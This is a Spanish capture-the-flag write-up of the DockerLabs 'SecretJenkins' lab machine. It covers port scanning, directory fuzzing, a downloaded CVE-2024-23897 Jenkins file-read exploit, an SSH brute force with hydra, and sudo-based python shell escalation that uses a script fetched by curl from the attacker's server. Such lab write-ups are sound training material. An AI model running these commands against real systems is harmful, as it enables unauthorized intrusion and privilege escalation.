# [SecretHacking](https://dockerlabs.es/)

## Despliegue

Primero desplegamos la máquina con ```bash auto_deploy.sh secretjenkins.tar``` (si no sabes en la página de DockerLabs ahí un pdf que lo explica).

## Reconocimiento

Una vez desplegada comprobamos que tenemos conectividad con ```ping -c 1 172.17.0.2``` 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/af4d0189-b640-4576-aca6-3c02c75c9434)
<br>
`-c 1` ⮞ solo lo repite una vez<br>
<br>
Ahora vamos con el reconocimiento de nmap ```nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts``` <br>
`-p-` ⮞ aplicar reconocimiento a todos los puertos <br>
`--open` ⮞ solo a los que estén abiertos <br>
`--min-rate 5000` ⮞ para enviar paquetes más rápido <br> 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida <br> 
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla <br> 
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro)<br> 
`-Pn` ⮞ ignora si esta activa o no la IP<br> 
`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)
<br>

Podemos ver los resultados en el archivo grepeable haciendo ```cat allPorts```, observamos que tan solo está abierto el puerto **8080** y el **22**
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/a1c0f66b-e114-4d9c-8b06-44d197ff9d93)
<br>
<br>
## Página Web (Puerto 8080)

Al ver que está abierto el puerto 8080 nos dirigimos al Navegador Web e introducimos la dirección IP como URL de la siguiente forma : `172.17.0.2:8080` ya que es el puerto 8080 el que aloja este servidor Web. Podemos ver un panel de login para Jenkins: 

<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/cedfd01c-7a4d-45a9-a0b0-dd8b66cf42ac)

<br>

Si probamos ha hacer un fuzzing web ya sea con gobuster o wfuzz. De la siguiente forma `gobuster dir -w /home/kali/WordLists/directory-medium -u http://172.17.0.2:8080/ -x txt,sql,py,js,php,html`, observamos que nos detecta muchos de subdirectorios.  <br>
`-w` ⮞ ruta al diccionario para usar en el descubrimiento de subdirectorios <br>
`u` ⮞ dirección donde se aloja el servidor web <br>
`x` ⮞ extensiones de archivos para descubrir en el fuzzing <br>
<br>

Si probamos con el primero de ellos `index` podemos ver que abajo a la derecha la versión del Jenkins usada: 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/7f7eda42-68f8-44bf-ab5e-eb70c4115cb2)

<br>
<br>

## Jenkins 2.441
Ahora que conocemos la versión de Jenkins podemos buscar en Internet en búsqueda de exploits para esta versión en especifico de la siguiente forma: `jenkins 2.44.1 github exploit`. Y nos encontramos con el siguiente repositorio de 
[github](https://github.com/Praison001/CVE-2024-23897-Jenkins-Arbitrary-Read-File-Vulnerability). En el encontramos un poco de información sobre la vulnerabilidad a explotar, la cual consiste en leer archivos 
del sistema (LFI)<br>

Nos descargamos el exploit en python con wget de la siguiente forma
`wget https://raw.githubusercontent.com/Praison001/CVE-2024-23897-Jenkins-Arbitrary-Read-File-Vulnerability/main/CVE-2024-23897.py` <br>, le asignamos permisos de ejecución con `chmod +x CVE-2024-23897.py`. Su uso es muy sencillo solo hay que poner la url de la página web con Jenkins y el archivo que queremos leer por lo tanto sería tal que así `python3 CVE-2024-23897.py -u http://172.17.0.2:8080/ -f /etc/passwd`. Y observamos el archivo de `/etc/passwd` donde podemos leer algunos usuarios como `bobby y pinguinito`.
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/081ea4f9-5afc-45e5-9375-a911c288fb91)
<br>
<br>

## Hydra / Medusa
Una vez conocemos los posibles usuarios los metemos un archivo llamado `users` aplicamos un ataque de fuerza fruta con hydra con el siguiente comando: `hydra -L users -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`. <br> 
`-h` ⮞ dirección IP de la máquina victima <br>
`-U` ⮞ el archivo con los posibles usuarios es decir (bobby,pinguinito) <br> 
`-P` ⮞ ruta del rockyou. Para descargar el diccionario [rockyou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) <br> 
<br>
Nos reporta lo siguiente: 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/13bb5fb7-d465-4fbe-8bde-1d49fe9f9bea)
<br>
<br>

## SSH (Puerto 22)
Una vez conocemos el usuario y su contraseña probamos a entrar a la máquina Vacaciones con `ssh bobby@172.17.0.2`, y a continuación nos pedirá la contraseña. *Si te aparece un error como este [aquí](https://desarrolloweb.com/faq/solucionar-remote-host-identification-has-changed-al-hacer-ssh) puedes encontrar la solución.* <br>![image](https://github.com/TerrorAterrador/WriteUps/assets/128630899/2128bd5f-33a2-4bb0-ac54-6555c7aa5817)
<br>
<br>

## Escalada de Privilegios
Comprobamos que hemos podido ingresar a la Máquina Víctima como **bobby** <br>
Si ejecutamos `sudo -l` podemos ver que podemos ejecutar `/usr/bin/python3` sin proporcionar contraseña con el usuario **pinguinito**.<br>

`-l` ⮞ listar comandos que podemos ejecutar como sudo <br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/784a5bb5-c6e0-4895-8a7e-abd7d12b0c20)
<br>

Por lo que deberíamos hacer ahora es dirigirnos a la página [GTFOBins](https://gtfobins.github.io/) (está página nos indica como elevar privilegios dependiendo del binario que podamos ejecutar), después nos vamos a la parte de sudo en python3, y nos encontramos con el siguiente comando `sudo python -c 'import os; os.system("/bin/sh")'`. Y lo ejecutaríamos de la siguiente forma `sudo -u pinguinito /usr/bin/python3 -c 'import os; os.system("/bin/bash")'`. <br>
<br>

Y ya seríamos el usuario **pinguinito**, ejecutamos otras vez el `sudo -l` y nos encontramos con lo siguiente: 
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/cedce804-521c-4d03-b0e4-76d927b1c1fc)
<br>

Por lo que nos dirigimos a la ubicación del archivo e intentamos modificarlo para ejecutar una shell con python, nos damos cuenta que no contamos con ningún editor de texto, pero si tenemos curl por lo que desde nuestra máquina de atacante nos creamos un archivo llamado `script.py` que contendría lo siguiente: <br>
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/5b7b63aa-43b6-49b4-ac98-acbc1d40dc20)
<br>

Nos montamos un servidor HTTP en python en la ubicación de nuestro archivo `script.py` de la siguiente forma `python3 -m http.server 80` para poder compartir dicho archivo con la máquina de **SecretJenkins**. <br>

Ahora en la máquina **SecretJenkins** accedemos al archivo de la siguiente forma `curl http://172.17.0.1/script.py -O script.py`, antes deberíamos haber puesto permiso de escritura en el archivo `script.py` con `chmod +w script.py`. Una vez tenemos dicho archivo hacemos `sudo -u root /usr/bin/python3 /opt/script.py` para ejecutar dicho archivo como root y listo ya somos root:  
<br>

![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/d9f1e7ce-a131-4683-9fdb-fe976dcad531)
